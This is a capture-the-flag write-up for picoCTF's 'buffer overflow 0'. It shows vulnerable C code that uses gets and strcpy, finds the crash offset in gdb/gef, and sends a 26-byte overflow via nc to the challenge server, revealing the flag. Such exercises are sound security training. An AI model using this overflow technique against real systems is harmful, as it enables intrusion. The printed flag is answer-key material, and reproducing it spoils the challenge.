# Writeup: buffer overflow 0

## Overview

- This challenge involves a simple buffer overflow to cause segmentation fault.

## Analysis

### Code Overview

- The `main` function prompts user to input a string using `gets` function:

```c
int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

- The `vuln` function copies the input into another buffer:

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

- The `sigsegv_handler` function is called when a segmenation fault occurs. It is defined to output flag:

- Segmentation fault occur when the program trying to access invalid memory address.

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

### Vulnerabilities

- The `gets` function does not check bounds, leading to a buffer overflow vulnerability.

## Exploitation Strategy

- Perform a buffer overflow to cause segmentation fault.

## Exploitation Steps

1. Determine the offset of the buffer.

- Open `gdb`:

```terminal
$ gdb vuln
```

- Create sequence of strings using `pattern create command`:

```terminal
gef➤  pattern create 150
[+] Generating a pattern of 150 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
```

- Run the program and input the generated pattern:

```terminal
gef➤  run
Input: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaa
```

- Inspect the registers content and notice that the value of `eip` is overflowed:

```terminal
───────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffce60  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0xffffcf00  →  "caabdaa"
$edx   : 0xffffcecc  →  "caabdaa"
$esp   : 0xffffce80  →  "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x565564a0  →  <__libc_csu_init+0> endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616168 ("haaa"?)
```

- Determine the offset using `pattern offset command`:

```terminal
gef➤  pattern offset haaa
[+] Searching for '61616168'/'68616161' with period=4
[+] Found at offset 25 (little-endian search) likely
```

- The offset is 25 bytes

- Input 26 bytes in the remote server to get the flag

```terminal
$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAA' | nc saturn.picoctf.net 63108
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Conclusion

This challenge demonstrates how to perform a basic buffer overflow to trigger a segmentation fault and retrieve a flag.
